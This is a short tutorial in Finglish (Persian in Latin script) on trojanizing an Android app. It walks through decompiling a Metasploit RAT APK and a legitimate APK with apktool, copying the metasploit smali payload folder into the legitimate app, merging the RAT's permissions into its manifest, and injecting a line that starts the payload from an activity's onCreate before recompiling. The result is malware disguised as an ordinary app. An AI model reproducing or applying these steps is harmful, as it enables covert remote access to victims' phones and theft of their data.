## Decompile and Recompile An android APK 🧰

Ghasd darim yek app ra decompile karde va pas az tazrigh metasploit dobare recompile konim 

$ bad az sakht metasploit tebgh ravesh gofte shode dar `Android-MetaSploit-L1` 2 kar zer ra bayad anjam dahim

```bash
apktool d /home/kali/Dekstop/rat.apk
```

```bash
apktool d /home/kali/Dekstop/app.apk
```

har 2 app ra decompile mikonim


## Install apktool ⬇️

abzar "apktool" b sorat pishfarz dar kali linux nasb nist va b shekl zer eghdam b nasb konid

```bash
sudo apt install apktool
```

$ bar roye joft poshe haye decompile shode app ha ras click karde va gozine `open as Root` ra mizanim ta baz shavand

### 2 kar ra bayad anjam dahim

1. **Jaygozine metasploit** Poshe "metasploit" ra az app alode dar address `smali > com > metasploit` dar hamin address dar app asli jaygozin mikonim
 
 
2. **Edit AndroidManifest.xml** bar roye har 2 file `AndroidManifext.xml` click rast karde va `Open With "MousePad" ra mizanim va karhaye zer ra anjam midahim

- copy ebeart ro b ro az "rat" b "app"        
`<uses-permission android:""/>`

- search `activity android` va dar hamon khat ebarat `android:name=` ro b rosh ye hamchin chizi hast : `com.google.android.gms.common.api.GoogleApiActivity`
- `com.google.android.gms.common.api.GoogleApiActivity` en masir ro dar "app asli" peyda mikonm
example : Poshe smali > Poshe com > Poshe google > Poshe android > Poshe gms > Poshe common > ..... > Akharesh b ye "file" mirsim 
- Dakhel file migardim donbal ebarat `onCreate(Landroid/os/Bundle;)v` Agar chand ta bood , On k avvalesh `method` Dare
- Ye Enter mizanim va khat badi en `invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V` ro ezafe mikonim


Dige ba "rat" kari nadarim va "app asli" ro Recompile mikonim va Tamam ....

```bash
apktool b /home/kali/Dekstop/app.apk
